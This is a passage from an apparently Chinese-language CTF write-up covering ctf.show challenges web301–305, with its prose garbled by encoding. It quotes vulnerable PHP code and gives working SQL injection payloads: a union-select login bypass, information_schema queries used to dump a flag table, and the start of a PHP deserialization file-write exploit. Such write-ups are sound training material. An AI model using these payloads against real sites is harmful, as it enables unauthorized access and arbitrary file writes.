class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>æ²¡æœ‰ä»»ä½•è¿‡æ»¤</p><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span> <span class="token operator">/</span>checklogin<span class="token operator">.</span>phpuserid<span class="token operator">=</span><span class="token number">1</span>' union select <span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>userpwd<span class="token operator">=</span><span class="token number">1</span></code></pre><h4 id="web302"><a href="#web302" class="headerlink" title="web302"></a>web302</h4><p>Hint:</p><pre class="language-php" data-language="php"><code class="language-php">ä¿®æ”¹çš„åœ°æ–¹ï¼š<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcasecmp</span><span class="token punctuation">(</span><span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$userpwd</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sds_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcasecmp</span><span class="token punctuation">(</span><span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$userpwd</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sds_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><pre class="language-php" data-language="php"><code class="language-php"># fun.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>æŒ‰ç…§åŒæ ·é€»è¾‘æ„é€ å³å¯</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// string(32) "d9c77c4e454869d5d8da3b4be79694d3"</span></code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">POST</span><span class="token punctuation">:</span> <span class="token operator">/</span>checklogin<span class="token operator">.</span>phpuserid<span class="token operator">=</span><span class="token number">1</span><span class="token string single-quoted-string">' union select '</span>d9c77c4e454869d5d8da3b4be79694d3' <span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>userpwd<span class="token operator">=</span><span class="token number">1</span></code></pre><h4 id="web303"><a href="#web303" class="headerlink" title="web303"></a>web303</h4><p>checklogin.phpé™åˆ¶äº†useridçš„é•¿åº¦</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>fun.phpå’Œsds_user.sqlç»™äº†å¼±å¯†ç æç¤º <code>admin/admin</code></p><pre class="language-php" data-language="php"><code class="language-php"># fun.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"sds"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 27151b7b1ad51a38ea66b1529cde5ee4</span><span class="token delimiter important">?></span></span># sds_user.sql-- ------------------------------ Records of sds_user-- ----------------------------INSERT INTO `sds_user` VALUES ('1', 'admin', '27151b7b1ad51a38ea66b1529cde5ee4');</code></pre><pre class="language-php" data-language="php"><code class="language-php"># dptadd.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'conn.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token comment">//æ³¨å…¥ç‚¹</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_name'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_name'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_address'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_address'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_address'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_build_year'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_build_year'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_build_year'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_has_cert'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_has_cert'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_has_cert'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_cert_number'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_cert_number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_cert_number'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_telephone_number'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_telephone_number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_telephone_number'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token variable">$dpt_name</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$dpt_address</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_address'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$dpt_build_year</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_build_year'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$dpt_has_cert</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_has_cert'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string double-quoted-string">"on"</span><span class="token operator">?</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">;</span><span class="token variable">$dpt_cert_number</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_cert_number'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$dpt_telephone_number</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dpt_telephone_number'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"set names utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"insert into sds_dpt set sds_name='"</span><span class="token operator">.</span><span class="token variable">$dpt_name</span><span class="token operator">.</span><span class="token string double-quoted-string">"',sds_address ='"</span><span class="token operator">.</span><span class="token variable">$dpt_address</span><span class="token operator">.</span><span class="token string double-quoted-string">"',sds_build_date='"</span><span class="token operator">.</span><span class="token variable">$dpt_build_year</span><span class="token operator">.</span><span class="token string double-quoted-string">"',sds_have_safe_card='"</span><span class="token operator">.</span><span class="token variable">$dpt_has_cert</span><span class="token operator">.</span><span class="token string double-quoted-string">"',sds_safe_card_num='"</span><span class="token operator">.</span><span class="token variable">$dpt_cert_number</span><span class="token operator">.</span><span class="token string double-quoted-string">"',sds_telephone='"</span><span class="token operator">.</span><span class="token variable">$dpt_telephone_number</span><span class="token operator">.</span><span class="token string double-quoted-string">"';"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$sql</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">===</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:dpt.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>é¦–å…ˆè®¿é—®apt.phpå¯ä»¥æ–°å¢è¡¨å•ï¼Œæ–°å¢åæŠ“åŒ…è¿›è¡Œsqlæ³¨å…¥</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/dptadd.php</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">48838e12-353f-4ed4-884e-5480a8bb5207.challenge.ctf.show</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=gd7ltvs2a269115fvk9s234121</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Dnt</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://48838e12-353f-4ed4-884e-5480a8bb5207.challenge.ctf.show/dpt.php</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">204</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>dpt_name=1&amp;dpt_address=1&amp;dpt_build_year=2024-08-01&amp;dpt_has_cert=on&amp;dpt_cert_number=a',sds_telephone=(Payload);%23&amp;dpt_telephone_number=a</code></pre><p>Payload:</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># æŸ¥è¡¨å  sds_dpt,sds_fl9g,sds_user</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># æŸ¥åˆ—å  flag</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'sds_fl9g'</span><span class="token comment"># getFlag </span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token string">'sds_fl9g'</span></code></pre><p><img src="web303.png" loading="lazy"></p><h4 id="web304"><a href="#web304" class="headerlink" title="web304"></a>web304</h4><p>Hint:</p><p>å¢åŠ äº†å…¨å±€waf</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">sds_waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]|-/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ä½†æ˜¯å…¶å®æ²¡æœ‰ä¸Šwafã€‚åªæ˜¯æ¢äº†ä¸ªè¡¨åï¼ŒæŠŠ<code>sds_fl9g</code>æ¢æˆäº†<code>sds_flaag</code>è€Œå·²ã€‚å…¶ä»–éƒ½åŒä¸Šé¢˜ã€‚</p><p>payloadï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> flag <span class="token keyword">from</span> sds_flaag</code></pre><h4 id="web305"><a href="#web305" class="headerlink" title="web305"></a>web305</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">sds_waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\=|\&#123;|\&#125;|\[|\]|\;|\:|\'|\"|\,|\.|\?|\/|\\\|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>è™½ç„¶è¿‡æ»¤å¾ˆç‹ ï¼Œä½†æ˜¯å¤šäº†ä¸ªclass.phpæ–‡ä»¶</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">user</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ç„¶ååœ¨checklogin.phpæ–‡ä»¶ä¸­å‘ç°äº†ååºåˆ—åŒ–æ“ä½œ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'conn.php'</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'fun.php'</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span><span class="token variable">$user_cookie</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$user_cookie</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$user_cookie</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$userpwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select sds_password from sds_user where sds_username='"</span><span class="token operator">.</span><span class="token variable">$username</span><span class="token operator">.</span><span class="token string double-quoted-string">"' order by id limit 1;"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token constant">MYSQLI_BOTH</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcasecmp</span><span class="token punctuation">(</span><span class="token function">sds_decode</span><span class="token punctuation">(</span><span class="token variable">$userpwd</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sds_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>ç›´æ¥æ„é€ ååºåˆ—åŒ–å­—ç¬¦</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">user</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token 